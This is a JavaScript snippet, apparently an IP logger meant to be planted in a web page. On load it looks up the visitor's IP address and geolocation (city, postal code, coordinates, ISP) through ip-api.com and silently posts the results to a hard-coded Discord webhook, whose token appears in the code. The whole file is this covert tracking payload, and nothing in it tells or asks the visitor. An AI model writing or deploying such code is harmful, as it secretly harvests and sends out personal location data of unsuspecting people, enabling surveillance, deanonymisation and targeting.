$.getJSON('http://ip-api.com/json', function(data) {
    const post = {
        "content": null,
        "embeds": [
          {
            "title": "`" + data.query + "`",
            "color": null,
            "fields": [
              {
                "name": "Status",
                "value": data.status + " "
              },
              {
                "name": "Country (" + data.countryCode + ")",
                "value": data.country + " "
              },
              {
                "name": "Region (" + data.region + ")",
                "value": data.regionName + " "
              },
              {
                "name": "City",
                "value":  data.city + " (" + data.zip + ")"
              },
              {
                "name": "Coordinates",
                "value": "Latitude: `" + data.lat + "`\nLongtitude: `" + data.lon + "`"
              },
              {
                "name": "Timezone",
                "value": data.timezone + " "
              },
              {
                "name": "Internet Service Provider",
                "value": data.isp + " "
              },
              {
                "name": "Organization",
                "value": data.org + " "
              },
              {
                "name": "Autonomous System",
                "value": data.as + " "
              }
            ]
          }
        ],
        "attachments": []
      }
      var request = new XMLHttpRequest();
      request.open("POST", "https://discord.com/api/webhooks/1088448891516624896/_yICwVYxsA1J66Wn3h-Bx1TdER1BPzcBSt7zATBio_nqO3y9bseeZ9XFo3zFGdpsolsm");

      request.setRequestHeader('Content-type', 'application/json');

      request.send(JSON.stringify(post));
});